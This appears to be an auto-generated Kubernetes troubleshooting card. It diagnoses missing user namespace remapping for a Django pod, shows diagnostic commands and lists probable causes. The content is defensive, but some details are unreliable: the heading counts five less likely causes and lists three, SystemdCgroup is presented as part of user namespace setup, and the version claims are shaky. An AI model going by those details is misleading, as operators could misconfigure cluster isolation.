🔍 Symptom: kubectl exec anihpj-api -- ps aux shows the Django process running as UID 1000 inside the container, but on the HOST: ps aux | grep python shows the same process running as UID 1000 — a direct 1:1 mapping. The container's root user (UID 0) would map DIRECTLY to the host's root user (UID 0). No user namespace remapping is in effect. If an attacker escapes the container, their UID maps to the same UID on the host — if they're root in the container, they're root on the node.

  kubectl exec anihpj-api -n anihpj -- id
  uid=1000(app) gid=1000(app) groups=1000(app)

  ps aux | grep python  # Run on the HOST
  1000  12345  /usr/local/bin/python manage.py runserver   ← UID 1000 on HOST = UID 1000 in CONTAINER!

  cat /etc/subuid   # On the host node
  # Empty or no entry for container users — no remapping configured
🔴5 Most Likely Causes
  1. User namespace remapping not enabled in container runtime: containerd/cri-o support user namespace remapping but it's NOT enabled by default. Requires --userns-remap in Docker or UserNSRemap in containerd config. Without it, container UIDs map 1:1 to host UIDs.
  2. No /etc/subuid and /etc/subgid entries for remapping: User namespace remapping requires subordinate UID/GID ranges defined on the host. /etc/subuid must have entries like containerd:100000:65536 mapping container UIDs to a high range on the host.
  3. Container runtime config doesn't enable user namespaces: containerd's config.toml needs [plugins."io.containerd.grpc.v1.cri".containerd.runtimes.runc.options] SystemdCgroup = true AND user namespace configuration enabled.
  4. Pod spec doesn't set hostUsers: false: In Kubernetes 1.30+, user namespaces are GA. Pod spec needs spec.hostUsers: false to enable per-pod user namespace remapping. Without it, no remapping occurs.
  5. Legacy cluster without user namespace support: Kubernetes versions before 1.25 don't support user namespaces. Clusters not upgraded can't use this feature.
🟡5 Less Likely Causes
  1. User namespace remapping incompatible with hostPath volumes: HostPath mounts with user namespaces require the host path to be owned by the remapped UID range. This complexity causes teams to disable remapping rather than fix permissions.
  2. Node filesystem permissions incompatible with remapped UIDs: PersistentVolume data has files owned by UID 1000 on the host. With user namespace remapping, container UID 1000 maps to host UID 101000 — the pod can't access its own data.
  3. Some CNI/CSI plugins break with user namespaces: Network and storage plugins that interact with host processes may fail when container processes show different UIDs. Teams disable remapping for compatibility.
